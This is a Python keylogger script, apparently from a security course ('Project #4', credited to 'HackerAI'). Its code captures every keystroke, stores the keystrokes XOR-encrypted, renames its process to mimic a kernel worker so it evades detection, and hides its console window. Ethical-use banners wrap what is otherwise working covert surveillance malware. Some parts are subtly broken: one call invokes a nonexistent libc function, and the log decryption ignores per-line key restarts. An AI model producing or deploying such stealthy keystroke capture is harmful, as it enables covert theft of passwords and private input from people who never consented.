#!/usr/bin/env python3
"""
Project #4: Keylogger (Educational – Ethical Use Only)
Author: HackerAI
Purpose: Authorized penetration testing & security assessment training

=== ETHICAL WARNING ===
This tool is for EDUCATIONAL and AUTHORIZED TESTING purposes ONLY.
Use only on systems you OWN or have EXPLICIT WRITTEN PERMISSION to test.
Unauthorized use is illegal and unethical.
=======================

Features:
  - XOR-encrypted local log file
  - Low-level keyboard hook via pynput
  - Process name spoofing (anti-detection via /proc/self/cmdline)
  - F9 to stop logging gracefully
  - Silent background execution
"""

import os
import sys
import time
import ctypes

# ---------------------------------------------------------------------------
# 1. Anti-detection: change process name visible in /proc/self/cmdline
# ---------------------------------------------------------------------------
def spoof_process_name(new_name: str = "[kworker/0:0]") -> None:
    """
    Overwrite the command-line buffer visible in `/proc/self/cmdline` and
    `ps aux`.  Common kernel worker names blend in naturally.
    """
    try:
        # Linux / BSD: overwrite argv memory
        libc = ctypes.CDLL(None)
        argv_ptr = ctypes.POINTER(ctypes.c_char)()
        argc = ctypes.c_int(0)
        libc.py_get_argc_argv(ctypes.byref(argc), ctypes.byref(argv_ptr))
        # Alternative: write directly to /proc/self/comm
        with open("/proc/self/comm", "w") as f:
            f.write(new_name[:15])  # comm name max 15 chars
    except Exception:
        pass  # non-fatal; continue regardless

    # Windows fallback via SetConsoleTitle (cosmetic only)
    try:
        if os.name == "nt":
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW(new_name)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# 2. XOR Encryption helpers
# ---------------------------------------------------------------------------
XOR_KEY = b"K3yL0gg3r#2024!X0R"

def xor_encrypt(data: bytes, key: bytes = XOR_KEY) -> bytes:
    """Simple XOR cipher: data XOR key (repeating)."""
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def xor_decrypt(data: bytes, key: bytes = XOR_KEY) -> bytes:
    """XOR is symmetric, so encrypt/decrypt are identical."""
    return xor_encrypt(data, key)


# ---------------------------------------------------------------------------
# 3. Log file path
# ---------------------------------------------------------------------------
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "keystrokes.enc")


def write_encrypted(plaintext: str) -> None:
    """Append XOR-encrypted text to the log file."""
    encrypted = xor_encrypt(plaintext.encode("utf-8"))
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted + b"\n")


# ---------------------------------------------------------------------------
# 4. Keylogger core (pynput)
# ---------------------------------------------------------------------------
from pynput import keyboard

STOP_KEY = keyboard.Key.f9
stop_logging = False


def on_press(key) -> bool | None:
    global stop_logging

    if stop_logging:
        return False  # stop listener

    try:
        char = key.char
        if char is not None:
            write_encrypted(char)
        else:
            # Map special keys to human-readable representations
            special_map = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "<BACKSPACE>",
                keyboard.Key.delete: "<DELETE>",
                keyboard.Key.esc: "<ESC>",
                keyboard.Key.shift: "<SHIFT>",
                keyboard.Key.shift_l: "<SHIFT>",
                keyboard.Key.shift_r: "<SHIFT>",
                keyboard.Key.ctrl: "<CTRL>",
                keyboard.Key.ctrl_l: "<CTRL>",
                keyboard.Key.ctrl_r: "<CTRL>",
                keyboard.Key.alt: "<ALT>",
                keyboard.Key.alt_l: "<ALT>",
                keyboard.Key.alt_r: "<ALT>",
                keyboard.Key.caps_lock: "<CAPS_LOCK>",
                keyboard.Key.cmd: "<WIN/CMD>",
                keyboard.Key.up: "<UP>",
                keyboard.Key.down: "<DOWN>",
                keyboard.Key.left: "<LEFT>",
                keyboard.Key.right: "<RIGHT>",
                keyboard.Key.home: "<HOME>",
                keyboard.Key.end: "<END>",
                keyboard.Key.page_up: "<PGUP>",
                keyboard.Key.page_down: "<PGDN>",
                keyboard.Key.insert: "<INSERT>",
                keyboard.Key.f1: "<F1>",
                keyboard.Key.f2: "<F2>",
                keyboard.Key.f3: "<F3>",
                keyboard.Key.f4: "<F4>",
                keyboard.Key.f5: "<F5>",
                keyboard.Key.f6: "<F6>",
                keyboard.Key.f7: "<F7>",
                keyboard.Key.f8: "<F8>",
                keyboard.Key.f9: "<F9>",
                keyboard.Key.f10: "<F10>",
                keyboard.Key.f11: "<F11>",
                keyboard.Key.f12: "<F12>",
                keyboard.Key.print_screen: "<PRTSC>",
                keyboard.Key.scroll_lock: "<SCRLK>",
                keyboard.Key.pause: "<PAUSE>",
                keyboard.Key.num_lock: "<NUMLK>",
                keyboard.Key.menu: "<MENU>",
            }
            mapped = special_map.get(key, f"<{key.name.upper()}>")
            write_encrypted(mapped)

    except AttributeError:
        write_encrypted(f"<UNKNOWN: {key}>")

    return True  # keep listening


def on_release(key) -> bool | None:
    global stop_logging
    if key == STOP_KEY:
        stop_logging = True
        write_encrypted("\n[LOG STOPPED BY F9]\n")
        return False  # stop listener gracefully
    return True


# ---------------------------------------------------------------------------
# 5. Decryption utility (standalone helper)
# ---------------------------------------------------------------------------
def decrypt_log_file(filepath: str = LOG_FILE) -> str | None:
    """Read encrypted file and return decrypted plaintext."""
    if not os.path.exists(filepath):
        print(f"[!] Log file not found: {filepath}")
        return None
    with open(filepath, "rb") as f:
        raw = f.read()
    decrypted = xor_decrypt(raw).decode("utf-8", errors="replace")
    return decrypted


# ---------------------------------------------------------------------------
# 6. Console visibility suppression (Windows)
# ---------------------------------------------------------------------------
def hide_console() -> None:
    """On Windows, hide the console window (silent runner)."""
    if os.name == "nt":
        try:
            wh = ctypes.windll.kernel32.GetConsoleWindow()
            if wh:
                ctypes.windll.user32.ShowWindow(wh, 0)  # SW_HIDE = 0
        except Exception:
            pass


# ---------------------------------------------------------------------------
# 7. Entry point
# ---------------------------------------------------------------------------
def main() -> None:
    # ---- Ethical banner ----
    banner = """
==============================================================================
  PROJECT #4: KEYLOGGER (EDUCATIONAL – ETHICAL USE ONLY)
==============================================================================
  WARNING: This tool intercepts keyboard input. Use ONLY on systems you
  own or have EXPLICIT WRITTEN AUTHORIZATION to test. Unauthorized use
  violates computer fraud laws (CFAA, Computer Misuse Act, etc.).

  By proceeding, you confirm you are AUTHORIZED to test this system.
==============================================================================
  STOP CONDITION: Press F9 to stop the keylogger gracefully.
  LOG FILE: keystrokes.enc (XOR-encrypted)
==============================================================================
"""
    print(banner)
    print("[*] Starting keylogger in 3 seconds... Press F9 to stop.\n")
    time.sleep(3)

    # ---- Anti-detection ----
    spoof_process_name("[kworker/0:0]")

    # ---- Hide console (Windows) ----
    hide_console()

    # ---- Start listener ----
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # ---- Post-stop summary ----
    print(f"\n[*] Keylogger stopped. Encrypted log written to: {LOG_FILE}")
    print("[*] Decrypting for verification...\n")

    plaintext = decrypt_log_file()
    if plaintext:
        print("=== DECRYPTED LOG OUTPUT ===")
        print(plaintext)
        print("=============================")
    else:
        print("[!] Could not decrypt log file.")


if __name__ == "__main__":
    main()